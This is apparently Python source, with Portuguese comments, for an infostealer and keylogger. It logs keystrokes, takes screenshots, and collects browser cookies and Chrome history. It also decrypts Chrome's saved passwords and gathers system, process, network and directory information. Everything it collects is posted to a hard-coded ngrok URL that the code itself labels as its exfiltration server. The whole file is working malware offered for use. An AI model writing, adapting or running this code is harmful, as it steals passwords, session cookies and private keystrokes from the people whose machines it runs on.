import os
import requests
import sqlite3
import json
import base64
import shutil
from datetime import datetime
from pynput.keyboard import Listener
import browser_cookie3
import platform
import socket
import uuid
from win32 import win32crypt  # Necessário para Windows
from Cryptodome.Cipher import AES
from pathlib import Path
from PIL import ImageGrab  # Para captura de tela
import psutil  # Já usado para informações de rede
import logging


# Configurações do servidor de exfiltração
SERVER_URL = "https://c16e-200-103-154-30.ngrok-free.app"

# Configuração do keylogger
BUFFER_SIZE = 50  # Envia dados após 50 teclas armazenadas
buffer = []


#Registra Logs
logging.basicConfig(
    filename="activity.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def log_message(message):
    logging.info(message)


# Função para capturar a tela (screenshot)
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        
        # Lê o arquivo de captura para envio
        with open(screenshot_path, "rb") as file:
            screenshot_data = base64.b64encode(file.read()).decode("utf-8")
        
        send_data("screenshot", {"file": screenshot_data})
        os.remove(screenshot_path)  # Remove o arquivo local após envio
    except Exception as e:
        print(f"Erro ao capturar a tela: {e}")
        save_local("screenshot_error", str(e))

# Função para capturar informações avançadas da rede
def capture_advanced_network_info():
    try:
        network_info = []
        
        # Interfaces de rede
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                network_info.append({
                    "interface": iface,
                    "address": addr.address,
                    "netmask": addr.netmask,
                    "family": str(addr.family)
                })
        
        # Conexões de rede
        connections = []
        for conn in psutil.net_connections(kind="inet"):
            connections.append({
                "fd": conn.fd,
                "family": str(conn.family),
                "type": str(conn.type),
                "local_address": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                "status": conn.status
            })

        send_data("advanced_network_info", {
            "interfaces": network_info,
            "connections": connections
        })
    except Exception as e:
        print(f"Erro ao capturar informações avançadas da rede: {e}")
        save_local("advanced_network_info_error", str(e))

# Função para enviar dados ao servidor
def send_data(data_type, data):
    try:
        payload = {
            "timestamp": datetime.now().isoformat(),
            "data_type": data_type,
            "data": data
        }
        response = requests.post(SERVER_URL, json=payload)
        if response.status_code == 200:
            print(f"Enviado com sucesso: {data_type}")
        else:
            print(f"Falha ao enviar {data_type}: {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar {data_type}: {e}")
        save_local(data_type, data)

# Função para salvar dados localmente (backup)
def save_local(data_type, data):
    timestamp = datetime.now().isoformat()
    with open("backup_log.txt", "a") as file:
        file.write(f"[{timestamp}] {data_type}: {data}\n")

# Função generalizada para capturar cookies
def capture_cookies():
    try:
        browsers = ["chrome", "firefox", "edge", "opera"]
        cookies = {}
        for browser in browsers:
            try:
                cookie_jar = getattr(browser_cookie3, browser)()
                cookies[browser.capitalize()] = {
                    cookie.name: cookie.value for cookie in cookie_jar
                }
            except Exception as e:
                print(f"Erro ao capturar cookies do {browser.capitalize()}: {e}")
        
        if cookies:
            print("Cookies capturados com sucesso!")
            send_data("cookies", cookies)
        else:
            print("Nenhum cookie capturado.")
    except Exception as e:
        print(f"Erro ao capturar cookies: {e}")
        save_local("cookies_error", str(e))

# Função para capturar teclas pressionadas
def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        elif key == key.space:
            buffer.append(" ")
        elif key == key.enter:
            buffer.append("[ENTER]\n")
        elif key == key.backspace:
            buffer.append("[BACKSPACE]")
        else:
            buffer.append(f"[{key.name}]")

        if len(buffer) >= BUFFER_SIZE:
            send_data("keylogger", "".join(buffer))
            buffer.clear()
    except Exception as e:
        save_local("keylogger_error", str(e))

# Função para capturar informações do sistema
def capture_system_info():
    try:
        info = {
            "username": os.getlogin(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_name": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.architecture(),
            "machine": platform.machine(),
            "uuid": str(uuid.uuid4())
        }
        send_data("system_info", info)
    except Exception as e:
        print(f"Erro ao capturar informações do sistema: {e}")
        save_local("system_info_error", str(e))

# Função para capturar informações sobre processos
def capture_process_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']):
            processes.append(proc.info)
        send_data("process_info", processes)
    except Exception as e:
        print(f"Erro ao capturar informações de processos: {e}")
        save_local("process_info_error", str(e))



#Capture Browser History
def capture_browser_history():
    history_path = os.path.join(
        os.environ['LOCALAPPDATA'], 
        "Google", 
        "Chrome", 
        "User Data", 
        "Default", 
        "History"
    )
    if os.path.exists(history_path):
        try:
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            history = [{"url": row[0], "title": row[1]} for row in cursor.fetchall()]
            conn.close()
            send_data("browser_history", history)
        except Exception as e:
            print(f"Erro ao capturar histórico do navegador: {e}")
            save_local("browser_history_error", str(e))



# Função para capturar arquivos sensíveis (exemplo com diretórios específicos)
def capture_sensitive_files():
    sensitive_dirs = [os.path.expanduser("~"), "/etc"]
    captured_files = {}
    try:
        for directory in sensitive_dirs:
            if os.path.exists(directory):
                captured_files[directory] = os.listdir(directory)
        send_data("sensitive_files", captured_files)
    except Exception as e:
        print(f"Erro ao capturar arquivos sensíveis: {e}")
        save_local("sensitive_files_error", str(e))

# Função para capturar credenciais salvas do Chrome
def capture_saved_credentials():
    if platform.system() == "Windows":
        login_db_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            "Google",
            "Chrome",
            "User Data",
            "Default",
            "Login Data"
        )
    elif platform.system() == "Darwin":
        login_db_path = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Default/Login Data"
        )
    elif platform.system() == "Linux":
        login_db_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    else:
        print("Sistema operacional não suportado para captura de credenciais.")
        return

    if not os.path.exists(login_db_path):
        print("Banco de dados de login do Chrome não encontrado.")
        return

    # Proteção contra bloqueio ao copiar o banco de dados
    temp_db_path = "temp_login_data.db"
    try:
        with open(login_db_path, "rb") as source_file:
            with open(temp_db_path, "wb") as target_file:
                shutil.copyfileobj(source_file, target_file)

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = []

        encryption_key = get_chrome_encryption_key()
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            if platform.system() == "Windows":
                password = decrypt_windows(encrypted_password)
            else:
                password = decrypt_mac_linux(encrypted_password, encryption_key)
            credentials.append({
                "origin_url": origin_url,
                "username": username,
                "password": password
            })

        send_data("saved_credentials", credentials)

    except Exception as e:
        print(f"Erro ao capturar credenciais: {e}")
        save_local("credentials_error", str(e))
    finally:
        conn.close()
        os.remove(temp_db_path)

# Funções auxiliares para descriptografia
def decrypt_windows(encrypted_password):
    try:
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
    except Exception as e:
        print(f"Erro na descriptografia no Windows: {e}")
        return None

def decrypt_mac_linux(encrypted_password, key):
    try:
        encrypted_password = encrypted_password[3:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password[:12])
        return cipher.decrypt(encrypted_password[12:]).decode('utf-8')
    except Exception as e:
        print(f"Erro na descriptografia no macOS/Linux: {e}")
        return None

def get_chrome_encryption_key():
    if platform.system() == "Windows":
        local_state_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            "Google",
            "Chrome",
            "User Data",
            "Local State"
        )
    elif platform.system() == "Darwin":
        local_state_path = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Local State"
        )
    elif platform.system() == "Linux":
        local_state_path = os.path.expanduser("~/.config/google-chrome/Local State")
    else:
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.loads(file.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove o prefixo "DPAPI"
            if platform.system() == "Windows":
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            else:
                return encrypted_key
    except Exception as e:
        print(f"Erro ao obter chave de criptografia: {e}")
        return None

# Bloco principal
if __name__ == "__main__":
    capture_system_info()
    capture_cookies()
    capture_process_info()
    capture_sensitive_files()
    capture_saved_credentials()
    capture_screenshot()  # Nova função
    capture_advanced_network_info()  # Nova função

    with Listener(on_press=on_press) as listener:
        listener.join()



        
